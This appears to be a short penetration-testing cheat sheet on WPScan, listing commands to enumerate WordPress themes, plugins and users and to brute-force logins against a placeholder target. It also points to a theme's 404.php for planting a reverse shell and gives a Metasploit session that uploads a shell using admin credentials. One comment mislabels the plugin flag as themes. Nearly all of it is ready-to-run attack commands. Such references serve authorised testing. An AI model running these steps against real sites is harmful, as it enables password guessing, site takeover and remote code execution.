---
description: https://www.kali.org/tools/wpscan/
---

# 🔍 WPScan

####

```bash
wpscan -h #List WPscan Parameters
wpscan --update #Update WPscan

#Enumerate WordPress using WPscan


wpscan --url "http://<TARGET_IP>" -e t #All Themes Installed

wpscan --url "http://<TARGET_IP>" -e vt #Vulnerable Themes Installed

wpscan --url "http://<TARGET_IP>"  -e p #All Plugins Installed

wpscan --url "http://<TARGET_IP>"  -e vp #Vulnerable Themes Installed

wpscan --url "http://<TARGET_IP>"  -e u #WordPress Users

wpscan --url "http://<TARGET_IP>"  --passwords path-to-wordlist #Brute Force WordPress Passwords

#Upload Reverse Shell to WordPress
http://<IP>/wordpress/wp-content/themes/twentyfifteen/404.php

#Upload using Metasploit
msf > use exploit/unix/webapp/wp_admin_shell_upload
msf exploit(wp_admin_shell_upload) > set USERNAME admin
msf exploit(wp_admin_shell_upload) > set PASSWORD admin
msf exploit(wp_admin_shell_upload) > set targeturi /wordpress
msf exploit(wp_admin_shell_upload) > exploit
```

<pre class="language-bash"><code class="lang-bash"><strong>#User Enumeration
</strong><strong>wpscan --url https://example/ --enumerate u
</strong>
#Bruteforce
wpscan --url https://example/ --passwords wordlist.txt --usernames samson
</code></pre>

### Additional References:

[https://www.geeksforgeeks.org/wpscan-tool-in-kali-linux/](https://www.geeksforgeeks.org/wpscan-tool-in-kali-linux/)
